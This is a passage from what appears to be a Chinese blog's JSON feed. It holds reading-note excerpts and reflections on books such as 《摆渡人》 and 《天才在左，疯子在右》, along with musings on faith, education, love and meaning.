class=\"markdownIt-Anchor\" href=\"#3-3\">#</a> 3-3</h3>\n<p>全世界日益世俗化，日益脱离其信仰根基与道德根基的道德危机，信仰危机，人心危机，乃止人生观颠覆。</p>\n<p>所谓秘密本身就是孕育诈骗的温床。我们这个时代缺少的就是精神信仰。当今社会正处在转型期，拜金，实用，利己主义盛行。各种矛盾凸显。</p>\n<p>要探究一个人自己或一切生物生存的目的或意义，从客观的观点来看，我总觉得是愚蠢可笑的。可是每个人都有一定的理想，这种理想决定着他努力和判断的方向。就在这个意义上，我从来不把安逸和享乐看作是生活目的本身–这种伦理基础，我叫他猪栏思想。要是没有志同道合者之间的亲切感情，要不是全神贯注于客观世界 — 那个在艺术和科学工作领域永远达不到的对象，那么在我看来，生活就会是空虚的。人们所努力追求的庸俗的目标–财产、虚荣、奢侈的生活，我总觉得都是可鄙的。</p>\n<p>金钱不是达到任何目的的手段，而直接就是目的本身，金钱就是他的上帝，是他人生的最高信仰。对金钱的过度崇拜，形成了信仰和道德的真空，金钱也就顺理成章的填补了其心理和精神上的真空，成为了他追求的唯一的人生目标。</p>\n<p>法律需要被信仰，否则就形同虚设。</p>\n<p>就司法人员的基本要求而言，最需要的不是职务有多高，学问有多深，头衔有多少，资格证书有多么权威，而是对司法的尊重和信仰。</p>\n<p>一个没有受到献身的热情和所鼓舞的人，永远不能做出什么伟大的事情来。</p>\n<p>我们的教育只是一味的强调培养人才，而往往忽视或缺乏对 “人” 的培养。我国浮躁的教育信仰，教育体制积弊甚深，人们浮躁、游离理性的教育信仰。社会上流传的读书无用论的思潮。</p>\n<p>信仰未必一定要像宗教那样天天祈祷，只要有所敬畏，有所坚持，就是信仰。</p>\n<p>只要维持公平的教育机会，贫穷就不会变成世袭，就不会世世代代的穷。</p>\n<p>为人师表，教书育人的教授，老师都开始沦落、腐败了，他们教育出来的学生会是怎么样呢？他们是否能为国家培养出真正的人才。</p>\n<p>无论何时何地，也不管行使权力的主体是谁，只要权力不受制约，就必然会产生腐败，这是一条铁律。无论何种腐败，从本质上讲，都是腐败者利用公共权力谋求个人私利的行为。很多教育腐败者，政治官员者，除了金钱权力，再无信仰而言。</p>\n<p>他们的要求并不高，只希望这次能得到教师应有的尊重，体面的离开，只希望自己走了以后孩子还能有人教。</p>\n<h3 id=\"3-5\"><a class=\"markdownIt-Anchor\" href=\"#3-5\">#</a> 3-5</h3>\n<p>大学生集体性缺乏稳固的人生观、价值观，在人生观、价值观游离不断的精神混乱下，受到全社会畸形的教育观，成功观的强烈刺激和影响，他们变得日益浮躁或者急躁，对社会现实的不满情绪日益递增。很多人的生命价值观开始偏离轨道，最终导致了极端行为。</p>\n<p>站在时代的风口浪尖下，在全球化市场经济的影响下，他们的思想渐渐成为了荒原，他们肆意挥霍青春和金钱，在风花雪月里无病呻吟，在论坛里争论庸俗、无聊的话题。精神信仰的迷失和价值观念的困惑，必定导致他们失去生活的目标，看不清前进的方向。长此以往，最终受害的将是整个民族。</p>\n<p>当代大学九宗罪：追求档次，堕落榜款，玩物丧志，寄生依赖，理性的侏儒、政治的冷漠与投机、学术精神的失落、道德素质低下，生理与心理缺憾。</p>\n<p>我们的信仰教育往往采用传统的灌输方式，并不能从本质上解决当代大学生的信仰危机 — 精神的痛苦，意义的失落，价值的迷茫，灵魂的虚无，以及生活中的无根感、疏离感、漂泊感。在这种没有信仰导航和意义支持的生命旅途之中，他们就像风中之烛摇曳不定。</p>\n<p>一些人为了救助他人的生命，付出了自己年轻的生命，这本身并不是值不值得的问题。他们在那一瞬间对救助生命的直觉和果断采取的行为，就是对自身生命的最好诠释，就是对自己信仰追求的最好表白。</p>\n<p>多少年来，大学一直是青年人的梦想。对于每个大学生来说，在学校时他们都会给自己描绘一幅壮丽的蓝图。不曾想，不知什么时候开始，这个神秘的殿堂开始悄悄变了样，这幅壮丽的蓝图在现实的就业面前消失了。</p>\n<p>莘莘学子继往开来，有人选择像左走，有人选择向右走，左边的是坎坷而跌宕的现实，右边是漫长而崎岖理想。越临近毕业，那些离自己的蓝图越来越远的毕业生就越来越多，而那些不愿放弃理想而选择现实的人则选择了逃避–考研。</p>\n<h3 id=\"3-6\"><a class=\"markdownIt-Anchor\" href=\"#3-6\">#</a> 3-6</h3>\n<p>空中楼阁是不存在的，当务之急是要及时建立自己正确的人生价值观念和精神信仰的支柱，在现实的土壤上构筑自己理想的大厦。如果考研或就业的选择，不是建立在清晰明了的职业规划和正确的人生观念基础之上，而仅仅是出于一种虚荣的心理盲目追求高学历，或者仅仅是为了逃避现实缓解就业压力，那么即便读研后也会出现更大的问题。</p>\n<p>在学术复杂，学术繁荣的大潮中，一些人为了博取个人的名利和地位，不惜抛开学术良知，使抄袭、剽窃、造假等腐败现象暗流涌动，甚至一些知名教授，著名 人士也混迹于伪科学之中。</p>\n<p>一个没有同情心，缺乏爱心，人和人之间冷漠的社会，一个没有温暖的社会，是一个没有未来的社会。诚信的丧失，价值取向的物质化，交往的功利化，传统文化的丧失，人文情怀的泯灭，拜金主义的盛行，腐败滋生。</p>\n<p>道德原则是社会的和整体的，在一定程度上，它是人们反对邪恶、反对无序，反对自己敌人的一个部分。</p>\n<p>任何堕落个体的联合都不能形成一个伟大的民族。这样的民族看起来是高度文明，但是，只要一面对逆境，立即就会四分五裂。</p>\n<p>他们的生活没有目标，更没有意义和价值。他们信仰迷茫、理想信念模糊、社会责任感缺乏，情感意识淡薄。他们的生存状态是麻木的。</p>\n<p>相信爱情，也许会让人失望，但信仰爱情，会令人瞬间生出希望。只要心中有所爱，人们宁可独守千年的孤独，怀揣着爱的诺言去守候，也不愿面对如织的人海，找不到那个可以爱的人。</p>\n<p>在这个感情速食，爱情泛滥的年代里，也许很多人早已不相信爱情。很多时候，我们都为自己轻佻的感情和出位的行为寻找各式各样的借口，把一切不忠的行为都归罪于社会的环境和外界的诱惑。其实，真正的爱情是一种信仰，只有虔诚的教徒才能真正拥有。因为，信仰的实现，是需要付出努力的。一个只求索取而不知回报的人，一个只知道享受爱的欢乐但不能共担风雨的人，也不配得到真正的爱情。</p>\n<h3 id=\"3-7\"><a class=\"markdownIt-Anchor\" href=\"#3-7\">#</a> 3-7</h3>\n<p>爱情还是爱情。没有了它，生活不像生活，灵魂无处依托，身似行尸走肉，心灵流离失所。</p>\n<p>婚姻是一切文明的开端，也是一切文明的顶峰。它使原始的粗野变得温良醇厚。最有教养的人也没有比这更好的机会来表现他们的温良醇厚。婚姻必须是牢不可破的。它带来如此多的幸福，任何个别的不幸相比之下都显得微不足道了。</p>\n<p>似乎婚姻成了坟墓的一种必然，不成坟墓倒是令人奇怪的事情。那些没有迈进婚姻门槛的人们还拍自己的爱情死去，而那些已经身处围墙之内的人们又以此为借口，为自己的问题设定一个理由。相信爱情与婚姻的本来面目是美好的而不是丑陋的，相信它是一个温暖的小巢而不是空坟。</p>\n<p>婚姻是爱情的信仰，爱情只是婚姻的一个狂热的宗教仪式。没有信仰的宗教仪式只是一次平常的作秀，不指向婚姻的爱情只是一次寻常的条件反射。婚姻不仅仅包括爱情这种仪式，还有责任、义务和信仰的忠诚。</p>\n<p>真正的朋友是一个灵魂寓于两个身体，两灵魂只有一个思想，两颗心的跳动是一致的。</p>\n<p>我们总是把友情加上这样那样的负荷，而使友情变了色彩的味道，抑或是把友情作伪自己谋取利益的工具、把朋友作为自己向上爬的垫脚石。</p>\n<p>爱一切值得爱的事物。哪怕活的孤独，活的卑微，活的艰辛、苍茫。</p>\n<p>我的信仰是无底深渊，澎湃着心中火焰，燃烧无尽的力量，那是忠诚所在。</p>\n",
            "tags": [
                "成长",
                "人生哲学"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/10%E3%80%8A%E6%91%86%E6%B8%A1%E4%BA%BA%E3%80%8B%E5%85%8B%E8%8E%B1%E5%B0%94%C2%B7%E9%BA%A6%E5%85%8B%E7%A6%8F%E5%B0%94/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/10%E3%80%8A%E6%91%86%E6%B8%A1%E4%BA%BA%E3%80%8B%E5%85%8B%E8%8E%B1%E5%B0%94%C2%B7%E9%BA%A6%E5%85%8B%E7%A6%8F%E5%B0%94/",
            "title": "《摆渡人》克莱尔·麦克福尔",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>如果最终的结局就是陷入无知无觉的昏迷状态，那穿越荒原又有何意义呢？</p>\n<h3 id=\"2-121\"><a class=\"markdownIt-Anchor\" href=\"#2-121\">#</a> 2-121</h3>\n<p>她讨厌那些不成熟的小男孩对自己的奚落，她讨厌这些目中无人的女生，脸上带着嘲讽的表情，她讨厌故意装聋作哑的蠢老师。</p>\n<p>他们之间的沉默像一堵完全穿不透的砖墙，他似乎很讨厌跟她呆在一起，好像是他当初迫于无奈才做出承诺，答应照顾她这个很麻烦的小妹妹似的，而她别无选择，只能继续演好她的角色。</p>\n<p>如果这一切都是真的，而她也已经预感到了这一点，那么木已成舟，不可更改了。她还在这，她还是她，如今已经万幸了。</p>\n<p>我就是知道，我了解他们的内心世界，他们的过去，他们的爱憎，他们的感情、希望和梦想。</p>\n<p>如果我真的存在，我的存在也是因为你们的需要。</p>\n<p>如果最终的结局就是陷入无知无觉的昏迷状态，那穿越荒原又有何意义呢？</p>\n<h3 id=\"2-122\"><a class=\"markdownIt-Anchor\" href=\"#2-122\">#</a> 2-122</h3>\n<p>她也尽力去想象如果一个人没有了自己的身份该是什么样的感受。自我完全由身边的人界定，永远没有独处的时刻。</p>\n<p>他的生活简直就像一座监狱，永无止境的轮回。他看到了那些自私的灵魂说谎、欺骗、浪费上天赐予他们的生命，而这却是他梦寐以求又求之不得的。</p>\n<p>在那个年代，人们比现实虔诚的多。他们不会质疑教会，而且对教会传导的东西深信不疑。</p>\n<p>但是我所看到的，我所感觉到的，并不使真正的你。</p>\n<p>睡眠像一道幕布一样，遮蔽了他们的自私和无知，他也乐得眼不见心不烦。</p>\n<p>他曾经保护引领无数的灵魂走完这段旅程。最开始的时候，他扮演的是安慰者的角色，后来证明这种方式不可能维持下去。他曾经关心着每一个灵魂，倾听他们的遭遇，尽力抚慰他们。因为他们失去了生命，也不再有未来，当然还要忍受抛下亲朋挚友带来的痛苦。</p>\n<p>这是成千上万的恶魔潜伏的地方，阴影在这里几乎永远不会消失，它们知道在这里有机会得逞。</p>\n<p>她这一死失去了多少东西啊？前途，家庭，朋友…… 全都没了。现在连她的灵魂摆渡人也离她而去了。</p>\n<p>她像是被战场上的炮弹声吓傻了似的，在麻木与呆滞中苟延残喘。</p>\n<p>你已经死了，你的心像就是你的全部。这个地方，这里，就是你旅程的必经之路，真相就是这样。</p>\n<p>但他生活在这个世界中，却从未体验过什么，从未长大过，他的年纪真的有那么大么？而对于一个思考和感知保持永恒状态的灵魂来说，年龄又算什么呢？</p>\n<p>你要是个摆渡人的话，就不能带着成见。每一个灵魂都是独特的，都有各自的美德和过错。</p>\n<p>他现在本不应该给她希望的，他很清楚自己终究得把这点希望再次夺走，他不应该的，可是他实在是无能为力。</p>\n<h3 id=\"2-123\"><a class=\"markdownIt-Anchor\" href=\"#2-123\">#</a> 2-123</h3>\n<p>这样做不对，这样做是不被允许的。他对她所有好感都是错误的，他不应该放纵这份感情，这是不应该发生的。然而他还是爱了，他渴望体验人类为之生，为之死的那种奇妙的爱情。</p>\n<p>他当然不可能逃离自己的岗位，在他之上还有更高的自然法则，还有不可撼动的命运。他的痛苦，他的绝望，他放弃自己职责的欲望都无足轻重。他无法掌控自己的命运，他甚至无法控制自己的双脚。</p>\n<p>她可能会重新过上往日的生活，或是将这种生活以某种古怪的方式还原，她也可能还是面对荒原之前那样形单影只，落落寡欢。</p>\n<p>他必须无动于衷，麻木不仁，如果他能集中精力的话，他很可能会对那个女人有愧疚之情。她看起来很和善，彬彬有礼，腼腆内向。</p>\n<p>“原来你在这里。” “我在这里。”</p>\n",
            "tags": [
                "人生",
                "生命",
                "命运"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/1%E3%80%8A%E5%A4%A9%E6%89%8D%E5%9C%A8%E5%B7%A6%EF%BC%8C%E7%96%AF%E5%AD%90%E5%9C%A8%E5%8F%B3%E3%80%8B%E9%AB%98%E9%93%AD/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/1%E3%80%8A%E5%A4%A9%E6%89%8D%E5%9C%A8%E5%B7%A6%EF%BC%8C%E7%96%AF%E5%AD%90%E5%9C%A8%E5%8F%B3%E3%80%8B%E9%AB%98%E9%93%AD/",
            "title": "《天才在左，疯子在右》高铭",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>水中泡沫也好，幻象也好，我只愿带着我这颗心，安静的为人。</p>\n<h3 id=\"2-51\"><a class=\"markdownIt-Anchor\" href=\"#2-51\">#</a> 2-51</h3>\n<p>你可以不相信，但是你不相信并不能影响客观现实的存在。</p>\n<p>时间的尽头是超出想象的，那个地方因为没有时间，很难理解。例如说，你向前走一步，同时你也就是向所有的方向走了一步。</p>\n<p>时间的尽头，有没有空气无所谓，有没有重力无所谓，肉体存在就存在了，可以存在于任何一个点–只要你愿意。如果继续向前走，也就是往所有的方向前进，可以亲自看到背影。</p>\n<p>没有时间的约束，就脱离了因果关系。</p>\n<p>没有了时间轴，没有了第四维的因果约束，你就可以在任何地方。</p>\n<p>意识是由我们的身体产生的，但是存在于相对来说，比我们身体更多纬地方。</p>\n<p>最开始没有生物，后来就有了；最开始没有地球，后来就有了，银河系也一样，宇宙也一样。所谓的凭空吗？凭空就是违反了物质世界的物理法则。但是，真的是凭空吗？无线电你看不到，红外线看不到，X 光你看不到。但是不管怎样难以想象或是不可思议，这一切的确存在。冷不丁把自己扔到 1000 年后，就像一个刚才来过这个世界的唐朝人。</p>\n<p>用唯物的角度去理解：瞬间就是永恒。</p>\n<p>梦是潜意识将一些现实扭曲反映到大脑的结果。</p>\n<p>我宁愿自己是那些干枯的尸体，我宁愿在什么灾难中死去，我不愿意一个人那么孤独的等着…… 找着…… 但是在梦里我就那么等着，我总是带着那么一点点希望等着，可是，从来没有等到过。每次视线里的移动都只是冰山，每一次耳边的声音都只是海水，每一次。那是刻骨铭心的悲哀，那是一个烙印，深深的烙在心上！我想尽所有的办法却挥之不去。那是一个很美的地方，但是却只有他的存在，他承受着全部寂寞等待着。</p>\n<p>所谓沉默类型笔试冷冷的或者阴郁的，他们只是不交谈，或者说：不屑于跟一般人交谈，自己跟自己玩儿好着呢。沉默类型中大体可以分三种：一部分伴有自闭症，一部分认为你思维跟不上他，没得聊；剩下的是那种很悲观、很消极的患者。实际上绝大多数病人都是复合类型。</p>\n<p>这个世界就是肮脏的，所有人都一样，道貌岸然下面都是下流卑鄙的嘴脸。我早看透了，你不认同也没有关系，没有人的本质是纯洁的，都一样。</p>\n<h3 id=\"2-52\"><a class=\"markdownIt-Anchor\" href=\"#2-52\">#</a> 2-52</h3>\n<p>选择？你错了！没有动力，永远是贪欲强于克制，卑鄙强于高尚。人就是这么下贱的东西。只有面对邪恶的时候，高尚的那一面才会被激发，因为那也是同时存在在体内的特质，神的意图就是这样的。当你面对暴行的时候，你会袒护弱小，当你面对邪恶的时候，你才会正义，当你面对恐惧的时候你才会无畏。</p>\n<p>人天生就不是纯洁的，每个躯壳在一开始就被注入了两种特性：神的祝福和恶魔的诅咒，事先注入这两样后，才是轮到人的灵魂进入躯壳。然后是灵魂。就夹杂在这中间挣扎着。各种欲望促使你的灵魂堕落，各种告诫又让你拒绝堕落，人就只能这么挣扎着。有意义吗？没有，都是无奈的本性。</p>\n<p>感情？那是为了繁衍的附加品。</p>\n<p>真正要做的，不是什么都放弃了，不是无任何态度去看，那不是超脱，那是淡漠了，就是俗话说的：没人味了。</p>\n<p>想看到真正的世界，就要用天的眼睛去看天，用云的眼睛去看云，用动物的眼睛去看动物，用人的眼睛去看人。</p>\n<p>大多数上了年纪的人，遇到什么事情还是会有很强烈的情绪，但是身体上又不允许有很强烈的反应，所以有时候他们的脾气就会很怪。</p>\n<p>因为，我们每个人都是有思想的，所以在看待事物的时候，其实是加了自己的主观意识。也就是说，你认为的鲜艳，在我看来并不见得是鲜艳，你看到的红，也许我会觉得是偏黄；你认为很文艺，而我觉得很通俗。</p>\n<p>那些经历，只是都是客观的，那些客观的影响了你，是你的思想，所以最终就是形成了你的主观。当你知道越来越多，你就和别人越来越不一样。实际上，每个人都是越来越和别人不一样。</p>\n<p>人类的眼球结构是球形晶体，根据透镜原理，景物投射给视网膜的是上下颠倒的图像，但是大脑自行处理了这个问题，左脑控制右手，右脑控制左手。但本质上，我们眼中的世界是颠倒的。</p>\n<p>你知道为什么有些时候，面对一些很明显的事物却难以分析，不敢下定义吗？其实是思维影响了人的判断。所以思维状态导致了人看不清本质，干扰了人判断的能力。</p>\n<h3 id=\"2-53\"><a class=\"markdownIt-Anchor\" href=\"#2-53\">#</a> 2-53</h3>\n<p>自从我习惯于沉迷在逻辑分析与理性辨析后，从未觉得情感是如此的重要。</p>\n<p>问题不在于他想的太多了，或是其他人想的太少了。而是对我们来说，未知太多了。如果说非要用奴役这个词的话，那我们都是被未知奴役着。直到终于我们看透、看清了所有事物的那一天。只是，不知道那一天还有多远。</p>\n<p>你只是我小说中的一个人物罢了，你的出现的目的就在于给我–这本书的主角添加上一些心理上的反应，然后带动整个事情，也就是整个故事发展下去。</p>\n<p>影子先生的五官，在不停的变换着形状，仿佛很多人的面孔，快速的交替浮现在同一张脸上。</p>\n<p>应该是我们，对我们的看法，我们对他来说不是现在的样子，因为他的眼界是跨越了时间，所以我们在它看来，都是蠕动的虫子一样的东西。跨越时间的看，我们是一个长长的虫子怪物，延伸到好多地方。</p>\n<p>绝对四维生物可以先看到我们死亡，再看到我们出生，没有前因后果。其实这个我很早就理解了：时间不是流逝了，流逝的是我们。</p>\n<p>真理属于人类，谬误属于时代。</p>\n<p>生活方式也一样，你应该摆脱惯性试试新的方式，不要遵从自己已经养成的习惯。习惯不见得都是好的，抽烟就不是好习惯。</p>\n<p>人类文明怎么了？很高贵？不能改变？谁说的，神说的？人说的？</p>\n<p>我们，人类，就是这么生活过来的，因为我们曾经很弱小，所以我们聚集在一起。现在我们聚集在一起，就是完全的破坏行为了！</p>\n<p>为什么习惯？因为我觉得那就是我的生活呀！</p>\n<p>在石头看来，就算我们原地站一辈子，他们也看不到我们，太短了！</p>\n<p>到底是信仰自己的心，还是在迷信一个人或者一个组织？真正的信仰是不会动摇的，哪怕没有神都不能影响自己的坚定，这才是信仰。真正的信仰，能包容所有的方式，能容纳所有的形式。</p>\n<p>科学技术问题，都不是问题，唯一存在的问题就是，人到底是不是能控制做自己所创造的一切，而避免自我毁灭。</p>\n<h3 id=\"2-54\"><a class=\"markdownIt-Anchor\" href=\"#2-54\">#</a> 2-54</h3>\n<p>也许人就是这么讨厌的动物把？想尽办法想知道结果，但是从来不像是否能承受这个结果。</p>\n<p>哪儿有什么天堂和地狱啊，都是灵魂四处溜达。</p>\n<p>我们的世界，还没有准备好容纳那么多稀奇古怪的事情。</p>\n<p>她说的也许没有错，无数人希望得到永生的眷顾，用各种方式去追求真身不腐，意志不灭。但是没人意识到，永生，也许，只是个孤独的存在。</p>\n<p>我觉得冥冥之中有一种人类理解之外的力量在推动整个世界，或者说，造就了整个世界。有些现象，如果用已知的各种学科、各种知识都不能解释的话，那么对于剩下的那些解释，不要看表面是否很荒谬或者离奇，都要学会去尊重。因为那很可能就是真正的答案。</p>\n<p>生和死，不重要，重要的是去尊重生命；生命是否高贵不重要，重要的是尊重自己的存在；在自己还有生命的时候，在自己还存在的时候，带着自己那颗人类的心，永不停息的追寻那个答案。有没有答案，不重要，重要的是充满期待。人类就是这样的，就是有一颗充满好奇，期待、希望、永不停息的心脏。</p>\n<p>从前我是瞎的，现在我看得见。</p>\n<p>知识永远不会是负担，欲望才是负担，有了知识，自己又附加了很多欲望出来，也就是说，获取只是的原始动力不是纯粹的。最初学院的建立是为了什么？为了传播知识，现在已经不是了，大学甚至成了虚荣的一部分。</p>\n<p>我们现在做事都是不纯粹的，都是有很多很多因素在里面。为什么就不能纯粹的做件事呢？纯粹的做一件事，多痛快呀。</p>\n<p>一个世界的人，看到的都是不一样的世界。反过来，这些不一样的世界，也影响了看待者本身，用很多世界来让一个人看！</p>\n<p>理论上没有正常人，因为正常这个概念是被群体化认可的。</p>\n<p>你有没有那种感觉：太多事情牵挂，太多事情放不开了？不是心情或者情绪问题，而是你太舍弃不了家人，朋友那些尘缘了。</p>\n<p>水中泡沫也好，幻象也好，我只愿带着我这颗心，安静的为人。</p>\n<p>因为这个世界的未知是存在的，不管你是不是认可，是不是无视，他们依旧存在着，毫不受影响。然后突然在你最想不到的时候，出现在你面前。</p>\n<h3 id=\"2-55\"><a class=\"markdownIt-Anchor\" href=\"#2-55\">#</a> 2-55</h3>\n<p>很多孩子读物其实是从成年人角度看的。</p>\n<p>我们很多习以为常的东西，本身就有问题，但是没人发现。</p>\n<p>当我们习惯了，就习惯了，但总有人会质疑这些。</p>\n<p>我喜欢这个新鲜的世界，而不是习惯的世界。每个人都有权利选择自己的喜欢，而不是必须跟别人一样的态度去看。</p>\n<p>人在做自己喜欢做的事情的时候，会很投入，很疯狂，而且会自己找问题，想办法。</p>\n<p>生存和兴趣永远是最好的动力。当然了，现在大家都在追求物质生活，把那个作为动力，也没什么不可以。很多人，用很多不同的方式，取走很多不同的事情。你不认同，只能说你所站的角度不同，也就是价值观的问题。</p>\n<p>我们看待事物的时候，经常用客观认知去理解，都说：就是那样的，其实很多客观认知只是一个假定罢了，很多事情都没解释清楚到底为什么。</p>\n<p>我们需要这么多可能性才去了解树到底会不会交流，而孩子不是，他们就很直接，很干脆的认为：树一定是会说话的！</p>\n<p>就算真的回到过去，也什么都做不了，只是个普通人罢了，或者是个普通的疯子。</p>\n<p>宗教的存在，还是很有必要的，把许多事情简化了。为何呢么会有人类呢？上帝造的。怎么造的呢？你管呢，上帝无所不能，想造就造。其实可以这么说，宗教总能解释最古怪、最离奇，最莫名其妙的事情，现在所有的一切，都可以用宗教来解释。</p>\n<p>如果你打算得到一些从没得到过的东西，那么你就得做一些从没做过的事情。</p>\n<p>所谓的现在，只是我们在某个刻度上罢了，而且，这个刻度就是我们自己定义的。在你没有真的了解一个理论的时候，不要轻易的引用，或者用来佐证，或者去反驳。你要先了解清楚，否则你很可能会成为一个笑话，因为你在做自己不擅长的事情。如果你非要那么做，只能证明你的无知和自以为是。</p>\n<p>在一光年以外看到地球，其实是看到的一年前的地球，假设你比光速快 3650 倍，很快来到地球了，那么你这时看到的地球，就是现在的。</p>\n<p>事情总有人在做，关注不关注，其实有媒体或者政府的诱导成分。</p>\n<p>时间，不存在，只是我们的一种态度，一种眼光。实际上，没有时间。</p>\n<h3 id=\"2-56\"><a class=\"markdownIt-Anchor\" href=\"#2-56\">#</a> 2-56</h3>\n<p>所谓的余光其实是视觉边缘，那个边缘是没有色彩感的，因为也不需要有色彩感。所以很多时候用余光去看，会出现模糊的一团，正经看却没了。正是如此，才会相当多的人对此疑神疑鬼。</p>\n<p>能够做什么，不能够做什么，不要自以为是。</p>\n<p>欧洲的强大，依靠的不是文明或者宗教，而是掠夺。</p>\n<p>如果，那是只有灵魂才能感受到的大风，那我们该怎么办。</p>\n<p>杀人到底是对错的概念不是你能决定的，而是你所在的群体决定的。你的群体赋予你杀人的权利了，你就可以杀。不给你杀人的权利，你杀人是要惩罚的。</p>\n<p>真正的解释不用解释，你吃饭不用解释，你喝水不用解释，因为你需要，那个是理由。活着不重要，因为已经活着了，所以想那些不是有意义的。</p>\n<p>那些你得到了，你是真的得到了，你不会就此罢手，你会无穷尽的想要更多。原本我认为不正常那部分，其实才是真的本质。而之前一直被一种假象覆盖着。最终我终于搞懂了，原来所谓正常的概念，都是你们这些疯子加给我的，而我原来是正常的，被你们的那些借口搞得不正常了。</p>\n<p>那两个看似无关的粒子，其实只是一部分–我们能看到的部分，而互相作用是关联的，我们目前却看不到。或者说：我们现有的仪器检查不到。</p>\n<p>物质是有尽头的。我们现在在拼命探索宇宙边缘，其实在探索的不是宇宙的边缘，而是在探索物质的边缘。等到找到物质边缘的时刻，那也就是找到了物质的尽头。</p>\n<p>将无数种过去、现在、将来，全部都是在一起的，就像一大块果冻一样。你可以改变或者有新的选择，但肯定还在这个大果冻里面，还在物质里面。</p>\n<p>人的很多行为都是用思维预演的，而预演的基础是经验，我们通过活这些年积累下来的经验。但是，这个经验还是物质的。</p>\n<p>精神，依托于物质而存在于物质世界，但是并不同于物质，也不属于物质世界。物质的尽头，是一个精神的世界。用物质来看，精神的存在地，是超出物质界限的。精神，存在于不存在之中。精神不属于物质，所以也就只能依托于物质才能感受到这个物质世界。</p>\n<h3 id=\"2-57\"><a class=\"markdownIt-Anchor\" href=\"#2-57\">#</a> 2-57</h3>\n<p>埋葬一个人，意味着死亡和失去。但是埋葬一颗种子，代表全新的生机即将开始。</p>\n<p>我种下了，不代表我要呵护着发芽后的那一切，我也没责任，没义务，没精力去照顾那些。我只是种下了而已，更多的，超出我的承受能力了。</p>\n<p>精神，不属于物质，谁都没有办法彻底的控制。如果能控制，只能证明一点：那个被控制的精神，是很脆弱的存在于物质当中。精神，可以让你决定自己的一切，但是你非要认为物质束缚自己了，那谁也帮不了你。存在于物质了，那就存在着吧。没办法用物质的比喻来彻底演绎精神的问题。</p>\n<p>如果你相信它是真的，那它就是假的，如果你觉得它是假的，它就是真的。</p>\n<p>鼻犁器，很多身上都有这个器官。那是一个特殊的感知器官，动物可以通过鼻犁器收集飘散在空气中的残留化学物质，从而判断对方的性别，威胁与否，甚至可以用来猎物追踪、预知地震。这就是人们常说很多动物拥有的第六感。人类虽然还存在这个器官，但已经高度退化。</p>\n<p>出家什么的只是形式，真的没必要拘泥于什么形式。相信佛就信好了，想参禅就参呗，谁说上班就不能信了？谁说非得在庙里才能清心寡欲了？信仰，信仰，自己都不相信去庙里有意义吗？</p>\n<p>毕竟这是一个庞杂到迷乱的世界，能清晰的意识到感觉的存在很不容易，或者说，很容易，只是很少有人愿意去做。</p>\n<p>脑细胞的自我意识怎么来的？聚一起释放电信号，化学信号。如果这就是产生意识的根本，那细菌也能做到。</p>\n<p>这个世界有那么些不对劲？一切都好像有点问题，倒是又说不清到底有什么地方不对劲，看不透什么地方有问题。有些时候会若隐若现的浮现出什么，等你想去抓的时候又没了。你有时候会很明显的感觉到问题不是那么简单，每一件事情，每一个物体后面总有些什么存在，而且你可以确定很多规律是相同的，但是细想又乱了。</p>\n<p>我们只看到了一部分世界，实际上，世界很大很大。大到超越了你的思维，想象全部是依托在认知上的，超越不了认知。</p>\n<h3 id=\"2-58\"><a class=\"markdownIt-Anchor\" href=\"#2-58\">#</a> 2-58</h3>\n<p>宗教也好，哲学也好，神学也好，科学也好，都是一个意思。追求的也是一个东西。那是你要找到，也是所有人找的–当然，你可以不用找，但是，总有人在找。</p>\n<p>思维真的是限制我们的一堵墙吗？世界到底有多大，在墙的另一边。</p>\n<p>不可改变性：回到 50 年前，你却没有办法杀死你的祖父，也许行凶过程中被人拦住了，也许你以为杀了他了，其实他没死，也许你根本找不到你祖父，也许你虽然杀了你祖父，但是那会你祖母已经怀上了你父亲…… 反正就是说你改变不了你已经存在的现实。</p>\n<p>没聪明脑袋的人是绝大多数，实际上到了这个时候，不聪明的人才会是社会的真正组成者。个别有那么一点聪明又不够坏的人只好安于现状，因为真正主导这个社会的，是不聪明的人。</p>\n<p>社会的结构在于延续和稳定，在同等一个规划下，既要学会遵守这个规则，还要在规则中胜出，这个才是精英的标准。我们的目的，不是选出最聪明的活下来，而是批量的活下来。</p>\n<p>如果把棋盘比喻成社会，依靠一个简单的规则，那么棋子就是人。大家都一样的状态，但是落点决定了你的与众不同。所有的历史，所有的辉煌，都是普通人创造的，不是那些天才，也不是那些聪明人。</p>\n<p>在规则中胜出，才是最重要的。</p>\n",
            "tags": [
                "社会",
                "人生哲学"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/20%E3%80%8A%E5%B0%91%E5%B9%B4%E7%BB%B4%E7%89%B9%E4%B9%8B%E7%83%A6%E6%81%BC%E3%80%8B%E7%BA%A6%E7%BF%B0%C2%B7%E6%B2%83%E5%B0%94%E5%A4%AB%E5%86%88%C2%B7%E6%AD%8C%E5%BE%B7/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/20%E3%80%8A%E5%B0%91%E5%B9%B4%E7%BB%B4%E7%89%B9%E4%B9%8B%E7%83%A6%E6%81%BC%E3%80%8B%E7%BA%A6%E7%BF%B0%C2%B7%E6%B2%83%E5%B0%94%E5%A4%AB%E5%86%88%C2%B7%E6%AD%8C%E5%BE%B7/",
            "title": "《少年维特之烦恼》约翰·沃尔夫冈·歌德",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>因为我彻底看清了，生活在你身边除了给你带来不快乐，毫无意义。</p>\n<h3 id=\"3-25\"><a class=\"markdownIt-Anchor\" href=\"#3-25\">#</a> 